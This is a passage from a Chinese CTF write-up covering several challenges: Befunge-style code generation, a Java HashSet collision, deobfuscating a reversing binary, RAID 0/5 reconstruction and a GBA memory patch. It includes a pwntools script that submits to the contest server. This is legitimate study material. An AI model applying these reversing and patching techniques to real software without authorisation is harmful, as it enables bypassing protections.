     >$:::::*****      ^
>:6-!|
v    <
     >$::::::******    ^
>:7-!|
v    <
     >$:::::::*******  ^
>:8-!|
v    <
     >$::::::::********^
>:9-!|
v    <
```

在第 5 至 14 层和第 15 层至 24 层我们分别实现了异或和普通或。同样由于输入的操作数一定在 1 和 9 之间，而这两种运算仅影响结果最低的四个比特，我们直接对操作数以及已有的数的最低四个比特进行打表。我们依次判断操作数是 1 至 9 的哪一个，然后进入对应的层。然后在每个操作数对应的层，我们复制一遍已有的数，用栈上数据交换和取模操作得到已有的数的最低四个比特和高位部分，然后依次判断最低四个比特是 0 至 15 的哪一个，然后进入对应的分支得到最低四个比特操作后的结果，最后再加回去。

```python
put(0,0,5,[
    "                          ",
    ">:456**-!!v               ",
    "[         _$~68*-v        ",
    "v                <        ",
])
for i in range(1,10):
    put(0,i*3+1,5,[
    " [  $<",
    ">:"+str(i)+"-!|",
    "v    <",
    ])
    put(0,0,5+i,[
    "      ]                  <",
    "                          ",
    "                          ",
    " >::44*%-12\\44*%v         ",
    "  v             <         ",
    ])
    for k in range(1,10):
        put(0,k*3+1,5+i,[
    " ^" if k==i else "  ",
    "  ",
    "  ",
        ])
    for j in range(16):
        put(2,j*3+5,5+i,[
    "       >$"+push4bit(j^i)+"+          ^",
    ">:"+push4bit(j)+"-!|                ",
    "v      <                ",
        ])
        pass
put(0,0,15,[
    "                          ",
    "[           _$~68*-v      ",
    ">:456**4+-!!^             ",
    "v                  <      ",
])
for i in range(1,10):
    put(0,i*3+1,15,[
    " [  $<",
    ">:"+str(i)+"-!|",
    "v    <",
    ])
    put(0,0,15+i,[
    "      ]                  <",
    "                          ",
    "                          ",
    " >::44*%-12\\44*%v         ",
    "  v             <         ",
    ])
    for k in range(1,10):
        put(0,k*3+1,15+i,[
    " ^" if k==i else "  ",
    "  ",
    "  ",
        ])
    for j in range(16):
        put(2,j*3+5,15+i,[
    "       >$"+push4bit(j|i)+"+          ^",
    ">:"+push4bit(j)+"-!|                ",
    "v      <                ",
        ])
        pass
```

同样的，如果想对程序结构有更直观的理解，以下是第 5 层生成出来的代码结构：

```plaintext

>:456**-!!v
[         _$~68*-v
v                <
 [  $<@@@@@@@@@@@@@@@@@@@@
>:1-!|@@@@@@@@@@@@@@@@@@@@
v    <@@@@@@@@@@@@@@@@@@@@
 [  $<@@@@@@@@@@@@@@@@@@@@
>:2-!|@@@@@@@@@@@@@@@@@@@@
v    <@@@@@@@@@@@@@@@@@@@@
 [  $<@@@@@@@@@@@@@@@@@@@@
>:3-!|@@@@@@@@@@@@@@@@@@@@
v    <@@@@@@@@@@@@@@@@@@@@
 [  $<@@@@@@@@@@@@@@@@@@@@
>:4-!|@@@@@@@@@@@@@@@@@@@@
v    <@@@@@@@@@@@@@@@@@@@@
 [  $<@@@@@@@@@@@@@@@@@@@@
>:5-!|@@@@@@@@@@@@@@@@@@@@
v    <@@@@@@@@@@@@@@@@@@@@
 [  $<@@@@@@@@@@@@@@@@@@@@
>:6-!|@@@@@@@@@@@@@@@@@@@@
v    <@@@@@@@@@@@@@@@@@@@@
 [  $<@@@@@@@@@@@@@@@@@@@@
>:7-!|@@@@@@@@@@@@@@@@@@@@
v    <@@@@@@@@@@@@@@@@@@@@
 [  $<@@@@@@@@@@@@@@@@@@@@
>:8-!|@@@@@@@@@@@@@@@@@@@@
v    <@@@@@@@@@@@@@@@@@@@@
 [  $<@@@@@@@@@@@@@@@@@@@@
>:9-!|@@@@@@@@@@@@@@@@@@@@
v    <@@@@@@@@@@@@@@@@@@@@
```

而这是第 6 层生成出来的代码结构：

```plaintext
      ]                  <


 >::44*%-12\44*%v
 ^v             <
         >$1  +          ^
  >:0  -!|
  v      <
         >$0  +          ^
  >:1  -!|
  v      <
         >$3  +          ^
  >:2  -!|
  v      <
         >$2  +          ^
  >:3  -!|
  v      <
         >$5  +          ^
  >:4  -!|
  v      <
         >$4  +          ^
  >:5  -!|
  v      <
         >$7  +          ^
  >:6  -!|
  v      <
         >$6  +          ^
  >:7  -!|
  v      <
         >$9  +          ^
  >:8  -!|
@@v      <
@@       >$8  +          ^
@@>:9  -!|
@@v      <
@@       >$29++          ^
@@>:19+-!|
@@v      <
@@       >$19++          ^
@@>:29+-!|
@@v      <
@@       >$49++          ^
@@>:39+-!|
@@v      <
@@       >$39++          ^
@@>:49+-!|
@@v      <
@@       >$69++          ^
@@>:59+-!|
@@v      <
```

最后在第 25 层，我们处理没有识别出操作符的情况，此时直接输出并终止：

```python
put(0,0,25,[
    "",
    ">$."
])
```

之后我们只需要把生成的代码转换成输入的格式：

```python
with open("prog.txt", 'w') as file:
    for i in range(256):
        for j in range(256):
            for k in range(256):
                if game_board[i][j][k] != "@":
                    file.write(f"({i}, {j}, {k}) -> {ord(game_board[i][j][k])} ")
    file.write("END")
```

然后发给服务端就好了：

```python
from pwn import *
conn = remote('202.38.93.111',10104)
conn.recvuntil(b':')
conn.send(b'<id>:<token>\n')
print(conn.recvuntil(b'>'))
data = open('prog.txt', 'rb').read()
conn.send(data+b'\n')
conn.interactive()
```

不过其实我一开始并没有发现发现 `\` 指令的语义和原始 Befunge 不同，导致我以为这个语言不是图灵完全的，所以才采用了打表的方式。当发现 `\` 指令改了之后我已经在准备打位运算的表了。既然 `\` 指令改得这么强，不打表应该也能做，甚至只使用两个维度就能完成。不过果然还是打表能体现出三维的优势嘛。

## 助记词 - 第一顿大餐

延时代码在 `Phrase.equals` 上，计时代码在里 `Instance.post` 里。阅读源码可知，一次请求其实可以添加多条助记词，那么直接同时提交 32 个相同的助记词便可以获得 Flag。在 `Phrase.equals` 上加上打印调用栈的代码，可以发现是在 `HashSet.add` 中对对象进行了比较。


## 超 OI 的 Writeup 模拟器 -  果然还是逆向比较简单

看起来是普通的逆向题，毕竟“继续逆向 1 题即可拿到下一个 Flag”。把 Binary 拖进 ghidra，可以看到有一个函数明显是用来检查输入是否正确的。这个函数的控制流被混淆过，简单来讲就是函数中有一个不参与其他运算的变量，各种控制流跳转的时候都会根据这个变量来判断，而这个变量最终只依赖于一个常数，这样我们可以把 ghidra 反编译出的代码复制出来，把我们关心的运算替换为输出代码文本，然后把常量带进去跑一跑，然后就可以得到实际进行的检查操作。然后再逐步从输出反推到输入即可。

## 阵列恢复大师 - RAID 0

我们需要获得数据分割的单位和盘的顺序。

首先对所有镜像分别执行 fdisk，发现其中一个盘开头有 MBR 记录，说明它是第一个盘。 MBR 记录显示，只有一个分区，从第 1 个块开始。在同一张盘的第一个块可以找到 GPT 表，其中显示只有一个分区，从第 2048 个块开始。另外，最后一个盘的结尾应当有一份备份的 GPT 表，由此可以确定最后一块盘。观察各个盘的数据发现，除了第一个盘以外的部分前 0x20000 个比特都是空的，而这相当于 256 个块，说明数据分割的单位大概是 256 个块的约数。

第一个盘的第 256 个块是以 `XFSB` 开头的，搜索可得这是 XFS 文件系统的 Superblock，那么我们便可以参考 [这份 XFS 结构介绍](http://ftp.ntu.edu.tw/linux/utils/fs/xfs/docs/xfs_filesystem_structure.pdf){: target="_blank" rel="noopener"} 进行分析。其中可以读出，一个文件系统块大小为 0x1000，根 inode 编号为 0x80，一共有四个 AG（Allocation Groups，分配组），每个 AG 有 0x1FBF 块，inopblog 为 3，agblklog 为 13。于是 inode 编号从低往高第 3 到 16 个二进制位是件系统块编号，所以根 inode 在第 16 个文件系统块。查看其后的 XFS AGI 结构（以 `XAGI` 开头）可得，一共只有 0x40 个 inode，整个 inode B+ 树只有一层，同时 inode B+ 树树根在第 3 个文件系统块。查看 inode 树树根可得，所有 inode 紧密排列在一起，第一个即为根 inode 。

由于 256 个块刚好等于 32 个文件系统块，而我们在第一个盘的 0x30000 位置找到了根 inode，所以数据分割的单位应当就是 256 个块。从这里开始，由于我们可以保证第一个 AG 的 Superblock 位置正确，我们便试着可以生成一个镜像，并试图使用 `xfs_db` 读取文件系统中虽然还不完整但是能部分解析出来的信息了。以下为生成镜像的部分脚本：

```python
infiles=[]
for d in disks:
	infiles.append(open(d,"rb"))
with open("test.img","wb") as outfile:
	for _ in range(stripe_count):
		for i in range(8):
			outfile.write(infiles[i].read(stripe_size))
for f in infiles:
	f.close()
```

我们之前说到一共有 4 个 AG，而每一个 AG 都会有一个 Superblock。由于每个 AG 有 0x1FBF 块，所以可以得到余下三个 AG 的 Superblock 应该处于的位置。由于第一个 Superblock 在 0x100000 处，所以后面三个 Superblock 分别位于 0x20bf000、0x407e000、0x603d000，在各个盘中搜索 `XFSB` 便可以以此确定第六、四、二块盘。不过需要当心的是，磁盘内的普通文件也含有 `XFSB` ，可能是套娃了一层镜像。

一旦所有的 AG 的 Superblock 的位置都正确了之后，我们便可以用 `xfs_repair -n -v` 来寻找各个文件自己的错误。输出的错误信息中的 `block m/n` 这样的信息指的是 AG 编号和 AG 内的文件系统块编号。知道了出错的结构的位置和类型，便可以调整剩下三个盘的顺序进行修复，如此便可以得到所有盘的顺序。我实际使用的是引用计数 B+ 数的位置。是不得不说，`xfsprogs` 的报错信息还是很不友好的。

重新生成镜像，检查完文件系统之后，我们便可以取出分区并挂载了：

```
dd if=test.img of=test-inner.img bs=512 count=260063 skip=2048
sudo kpartx -av test-inner.img
sudo lsblk -f
sudo mount /dev/loop0 /mnt/raid0
```

之后如题目要求执行脚本就可以拿到 Flag。


## 阵列恢复大师 - RAID 5

这次除了数据分割的单位、盘的顺序以外，我们还需要获得阵列内的数据排布方式。毕竟 RAID 5 的数据有四种不同的排布方式（[参考这个图示](http://www.reclaime-pro.com/posters/raid-layouts.pdf){: target="_blank" rel="noopener"}）。

首先同样查看各个盘开头的开头，发现其中两个盘开头有 MBR 和 GPT 表，那么他们其中一个存放有第一块数据，另一个存放有第一块校验位。这次我们先查看各个盘的结尾，寻找备份 GPT 表，发现另外两个完全不同的盘结尾有备份 GPT 表，那么他们其中一个存放有最后一块数据，另一个存放有最后一块校验位。那么，由于在 Left asymmetric 的数据排布方式中，最后一块盘一定存放了第一块校验位，以及最后一块数据和最后一块校验位之一，所以可以直接排除这种情况。

这次 GPT 表同样显示只有一个分区，从第 2048 个块开始。那么我们考虑各个盘的 0x40000 位置，虽然没有 XFSB 这样明显的表记，但是很幸运地被我猜到了其中一个开头有 MBR 和 GPT 表的盘和另一个盘的 0x40400 位置有 EXT4 的 superblock，那么我们便可以参考 [这份 EXT4 结构介绍](https://www.kernel.org/doc/html/latest/filesystems/ext4/index.html){: target="_blank" rel="noopener"} 进行分析。鉴于 EXT4 的 superblock 之前会有 1024 比特的预留位置，所以数据分割的单位大概是 512 个块的约数。比对 superblock 中记载的文件系统块数量和 GPT 表中的文件系统块数量，可以得知开头没有 GPT 表的那个盘上的是正确的 superblock。在 EXT4 的 superblock 中记载了一个文件系统块大小为 1024 字节（s_log_block_size 为 0），而每个 block group 有 8192 个文件系统块，以及 2032 个 inode。查看第一个 block group descriptors 的内容，发现第一个 block group 的 block bitmap 位于第 259 个文件系统块处。而那之前的文件系统块应当是未使用的文件系统块，但是可以发现，这些未使用的文件系统块开头不知为何似乎记录了当前块的序号。根据这些未使用的文件系统块的位置，我们可以确定数据分割的单位为 0x10000 比特，也即 128 个块。而由第 256 个文件系统块的位置可知，阵列的数据排布方式为 Left symmetric。再根据这些文件系统块的分布我们便能知道盘的顺序。这样我们便可以生成镜像原来的镜像了，以下为部分脚本：

```python
infiles=[]
for d in disks:
	infiles.append(open(d,"rb"))
with open("test.img","wb") as outfile:
	for k in range(stripe_count):
		for i in range(4):
			outfile.write(infiles[(i-k)%5].read(stripe_size))
		infiles[(4-k)%5].seek(stripe_size,1)
for f in infiles:
	f.close()
```

检查完文件系统之后，我们便可以取出分区并挂载了：

```
dd if=test.img of=test-inner.img bs=512 count=260063 skip=2048
sudo kpartx -av test-inner.img
sudo lsblk -f
sudo mount /dev/loop0 /mnt/raid0
```

同样地，之后如题目要求执行脚本就可以拿到 Flag。

## 卷王与野生的 GPA

好耶，是 GBA。从小学的时候我就开始用 GBA 模拟器打游戏了。

我们首先在 ghidra 中打开随附的 elf 文件，可以看到出题人贴心地提供了函数符号等信息。然后打开 Visual Boy Advance 启动 GBA 游戏。虽然以前玩游戏的时候没用到，但是 Visual Boy Advance 提供了强大的调试功能，你可以查看 CPU、内存、图形单元等的状态，而且你还可以直接连 gdb 进行调试。当然，这次我们只需要在 Visual Boy Advance 内部修改内存就够了。

首先，可以看到 `main` 函数中，程序会反复检查全局变量 `ball` 的值并，不为 0 时才会进行下一步操作，否则只会不停获取按键。我们直接修改对应的内存值，然后就可以进入有球可以扔的分支了。然而，这并没有什么用，代码写死了你是抓不到 GPA 的。

其次，可以发现有一个可疑的 `decrypt` 函数从来没有被调用过。和 `showtext` 等函数比对后可以发现这个函数可能会在屏幕上显示一张图。我们直接修改内存，把 `main` 函数里面那个循环里面的调用获取按键的 `getkey` 函数的指令直接改为调用 `decrypt` 函数的指令，然后立刻就能显示出 Flag 了。

不过看了官方题解之后才发现原来还藏了一些别的东西……

## 关于其他未解出的题目

以上就是我所有解出的题目的 Writeup 了。这里我再大致评论一下我没解出的题目：

- 赛博厨房：注意到了实际上菜谱是完全依赖于已经记住的程序的哈希的，事实上由于题目前端有 sourcemap，可以直接得到具体的 Hash 过程。虽然想到了需要碰撞，但是由于看到是 SHA256 所以感觉不太会有高效的碰撞方法，所以放弃了。看了题解之后才知道原来还可以用地上的盘子传递信息。
- 灯，等灯等灯：第一小问应当是解线性方程组就可以了，然而万恶的出题人居然用 Dart 和 Flutter 写前端，导致获取预期输出和自动点击比较麻烦，所以最后没做。（出题人提到说可以直接调用提交接口，然而我怎么知道提交接口在哪里呢？）至于后两问，那就是我最不擅长的机器学习相关内容了，总之还是学习一个。
- 只读文件系统：比赛时因为解题人数少根本没看这个题。现在看来还是并没有那么困难的。
- 一石二鸟：比赛时同样因为解题人数少根本没看这个题。原来是 Haskell 相关的题啊，以后一定要找个机会学学 Haskell。至于实际的 pwn 过程，总之还是学习了。
- 链上预言家：是我另一个最不擅长的区块链相关内容。虽然不是很懂，但是看题解大概还是能看出一点感觉来的。
- 助记词：想到了需要构造哈希碰撞，但是不太了解 Java 的 Hash 方法的具体实现所以放弃了。不过直接硬找碰撞只需要半小时是完全没有想到的。
- Co-Program：因为感觉会很麻烦所以直接放弃了。原来第一问可以用 Z3 做啊，以前在编译原理专题训练的课上还用过这玩意儿呢。至于第二问，确实是听说过有程序生成这回事，不过可以直接用现成工具是没想到的。学习了。
- 密码生成器：用 ghidra 打开之后一头雾水，原来果然是加壳了。不过去壳之后的部分也很复杂，但是倒也不是完全没有希望。最后结果上果然还是密码生成器的生成结果只依赖于当前时间。总之下次遇到这种二进制还是应该想一想有没有办法检测壳的类型并去壳。
- 外星人的音游掌机：虽然以前在计算机组成原理课上造 CPU 的时候接触过 FPGA，但是没有去找对应的逆向工具链的，也没有想到在这些工具的帮助下这个题其实可以这么简单。我完全理解了。
- fzuu：很复杂。从 Fuzz 到定位问题到利用需要花费比较大的精力，但是总之还是学习了。
- Make a wish：看了这个题解，我大受震撼。最后果然只有第一名做出来了这个题。不过还是希望大家有机会尝试一下 NetHack，至于我嘛，Steam 库里还有一堆 Rougelite 要打呢。
- 超 OI 的 Writeup 模拟器：如果给我足够多的时间，第二个 Flag 大概是可以手动解出来的，但是果然还是应该自动化一点。大概理解了自动化分析是个什么流程。

## 总结

不得不说，今年的 BPC 还是比去年要强很多的，甚至拿到了 15 名的好成绩，一共拿了 4850/9450 分，我都不知道我还可以这么强。在做题的过程中也学到了一些新的有趣玩意儿。明年有空一定还来。